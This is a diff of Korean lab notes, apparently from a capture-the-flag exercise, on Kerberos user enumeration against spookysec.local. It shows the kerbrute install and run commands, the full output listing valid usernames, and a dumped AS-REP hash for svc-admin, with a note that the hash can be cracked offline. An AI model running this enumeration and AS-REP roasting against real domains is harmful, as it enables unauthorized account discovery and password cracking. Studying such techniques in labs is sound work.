@@ -277,16 +277,51 @@ S-1-5-21-<도메인 식별자>-<RID> <도메인 이름>\<계정 이름> (<계정
 
 # Kerberos Enumeration
 
+# 설치
+
 wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
 chmod +x kerbrute
 sudo mv kerbrute /usr/local/bin/
 apt install golang
 
-# list 는 txt 파일로 저장되어야 합니다.
-
-kerbrute userenum --dc 10.10.206.91 -d spookysec.local -o found_users.txt /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10
+# 실행
 
 dc: 도메인 컨트롤러의 IP 주소
 d: 도메인 이름 (spookysec.local)
 o: 결과를 저장할 파일 이름 (found_users.txt)
 t: 스레드 수 (동시 요청 수, 기본값은 10)
+
+kerbrute userenum --dc 10.10.206.91 -d spookysec.local -t 100 userlist.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 07/06/25 - Ronnie Flathers @ropnop
+
+2025/07/06 06:55:59 >  Using KDC(s):
+2025/07/06 06:55:59 >   10.10.206.91:88
+
+2025/07/06 06:55:59 >  [+] VALID USERNAME:       james@spookysec.local
+2025/07/06 06:56:00 >  [+] svc-admin has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$18$svc-admin@SPOOKYSEC.LOCAL:eb7960f3000af4f080ea83a3bfcecf85$72c40a3cb926c5f8b3cc13cef014f763655df20a11bc61d3906484b260bda7671bf741abdc92c4f7b1c2bdaa56519a04890dc47f428075619a71ebae1bb8577199b14a9c9032fff2027e12d432e07f7ec2b764942855aeeaeafedd9347900404fd3e8c27b363d2380cb22803315fb27177d07535b38f1099eac31da01b94ace1e0f40009679329bba6e44a35dba35ab0edcd397ae6604fd0430182417d54bc99ed5141846d60249be0e2bd0153d69e6d12963e799dbf0ad6582e318e8d015b274e58af153c4ac5918c0235537720320d245fb927b222f9f47f41c1d4a08d4bc927081fc751c61f27e50f0167f171d0d4b42dc6aa159104c0d3ae404caeb12b646b1b7474cd98                                                                                                   
+2025/07/06 06:56:00 >  [+] VALID USERNAME:       svc-admin@spookysec.local
+2025/07/06 06:56:01 >  [+] VALID USERNAME:       James@spookysec.local
+2025/07/06 06:56:01 >  [+] VALID USERNAME:       robin@spookysec.local
+2025/07/06 06:56:04 >  [+] VALID USERNAME:       darkstar@spookysec.local
+2025/07/06 06:56:06 >  [+] VALID USERNAME:       administrator@spookysec.local
+2025/07/06 06:56:10 >  [+] VALID USERNAME:       backup@spookysec.local
+2025/07/06 06:56:11 >  [+] VALID USERNAME:       paradox@spookysec.local
+2025/07/06 06:56:21 >  [+] VALID USERNAME:       JAMES@spookysec.local
+2025/07/06 06:56:25 >  [+] VALID USERNAME:       Robin@spookysec.local
+2025/07/06 06:56:47 >  [+] VALID USERNAME:       Administrator@spookysec.local
+2025/07/06 06:57:30 >  [+] VALID USERNAME:       Darkstar@spookysec.local
+2025/07/06 06:57:44 >  [+] VALID USERNAME:       Paradox@spookysec.local
+2025/07/06 06:58:30 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
+2025/07/06 06:58:44 >  [+] VALID USERNAME:       ori@spookysec.local
+2025/07/06 06:59:09 >  [+] VALID USERNAME:       ROBIN@spookysec.local
+2025/07/06 07:00:12 >  Done! Tested 73317 usernames (16 valid) in 252.886 seconds
+
+# svc-admin 계정은 Pre-Auth가 필요하지 않으므로 AS-REP Roasting이 가능합니다. 이 계정의 해시를 오프라인에서 크랙할 수 있습니다.
